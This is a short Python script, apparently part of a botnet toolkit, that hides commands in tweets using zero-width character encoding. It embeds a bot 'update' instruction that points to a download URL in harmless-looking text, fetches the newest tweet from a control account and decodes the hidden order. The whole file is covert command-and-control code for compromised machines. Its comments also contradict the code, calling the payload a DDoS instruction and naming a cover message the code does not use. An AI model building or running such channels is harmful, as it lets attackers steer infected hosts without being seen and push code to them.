from zw_encode import encode,decode
from tweet import last_tweet, post_tweet

# Embed a DDoS instruction inside the provided message "once upon a time"
encoded_msg = encode("http.update http://google.com/dl.zip", "I wish I could update my bot.")

# Post the newly encoded command to the Twitter account associated with the API keys
#post_tweet(encoded_msg)

# Fetch the latest botnet instruction from the command twitter account "ProjectDF2"
cmd_tweet = last_tweet("ProjectDF2")

# Extract the botnet command from the tweet
decoded_msg = decode(cmd_tweet)

# Display our recovered, original instruction
print (decoded_msg)
